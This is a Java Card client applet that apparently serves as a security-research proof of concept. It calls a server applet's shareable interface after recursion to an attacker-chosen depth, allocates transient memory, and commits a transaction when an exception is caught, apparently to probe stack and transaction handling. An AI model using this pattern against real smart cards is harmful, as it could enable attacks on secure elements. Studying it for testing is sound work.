package clientPackage;

import javacard.framework.*;
import serverPackage.SimpleSI;

public class ClientApplet extends Applet{

    public byte[] sAID = new byte[] {(byte)0x55, (byte)0x55, (byte)0x55, (byte)0x55, (byte)0x55, (byte)0x01};
    public AID serverAID =  new AID(sAID, (short)0, (byte) 6);
    public SimpleSI serverSI;

    public static void install(byte[] bArray, short bOffset, byte bLength){
        new ClientApplet().register(bArray, (short) (bOffset + 1), bArray[bOffset]);
    }

    public void process(APDU apdu) {
        if(selectingApplet())
            return;

        byte[] buf = apdu.getBuffer();
        apdu.setIncomingAndReceive();
        short counter = Util.getShort(buf, ISO7816.OFFSET_CDATA);
        byte transient_len = buf[ISO7816.OFFSET_CDATA + 2];

        switch (buf[ISO7816.OFFSET_INS]) {
            case (byte)0x00: // Leveraging Recursive Calls
                serverSI = (SimpleSI)JCSystem.getAppletShareableInterfaceObject(serverAID, (byte)0);
                try {
                    call_server_service(serverSI, counter, transient_len);
                } catch (ISOException isoExc) {
                    ISOException.throwIt(isoExc.getReason());
                } catch (Exception e) {
                    JCSystem.commitTransaction();
                }
            break;

            default:
                ISOException.throwIt(ISO7816.SW_INS_NOT_SUPPORTED);
            }
    }
    
    public void call_server_service(SimpleSI serverSI, short iterations, byte transient_len){
        if (iterations == 0){
            if (transient_len > 0){
                byte[] towaist = JCSystem.makeTransientByteArray((short)transient_len, JCSystem.CLEAR_ON_RESET);
            }
            serverSI.foo((short)0x6A01, (short)0x6A02, (short)0x6A03);
        } else
            call_server_service(serverSI, (short) (iterations - 1), transient_len);
    }
}